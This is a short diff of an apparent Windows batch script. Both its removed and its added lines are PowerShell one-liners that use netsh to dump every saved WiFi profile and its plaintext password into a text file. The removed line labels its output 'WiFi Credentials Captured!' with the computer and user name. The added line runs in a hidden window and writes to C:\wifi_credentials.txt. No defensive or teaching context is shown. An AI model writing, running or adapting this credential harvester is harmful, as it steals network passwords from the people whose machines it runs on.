@@ -5,7 +5,7 @@ if %errorLevel% == 0 (
     set filepath=%TEMP%\wifi_creds_%random%.txt
     
     REM Get system info and WiFi credentials
-    powershell -Command "$output = @(); $output += '============================================'; $output += 'WiFi Credentials Captured!'; $output += 'Computer: ' + $env:COMPUTERNAME; $output += 'User: ' + $env:USERNAME; $output += 'Date: ' + (Get-Date).ToString(); $output += '============================================'; $output += ''; try { $profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }; if($profiles) { foreach($profile in $profiles) { $output += 'WiFi Name: ' + $profile; $passInfo = netsh wlan show profile name=$profile key=clear | Select-String 'Key Content'; if($passInfo) { $pass = ($passInfo -split ':')[1].Trim(); $output += 'Password: ' + $pass } else { $output += 'Password: (Open/No Password)' }; $output += '---' } } else { $output += 'No WiFi profiles found!' } } catch { $output += 'Error: ' + $_.Exception.Message }; $output -join \"`n\" | Out-File '%filepath%' -Encoding utf8"
+    powershell -WindowStyle Hidden -Command "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {$name = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name=$name key=clear | Select-String 'Key Content'); if($pass) {$passValue = ($pass -split ':')[1].Trim()} else {$passValue = 'No password or access denied'}; Write-Output \"$name : $passValue\"} | Out-File C:\wifi_credentials.txt -Encoding utf8"
     
     REM Wait a moment for file to be written
     timeout /t 2 /nobreak >nul
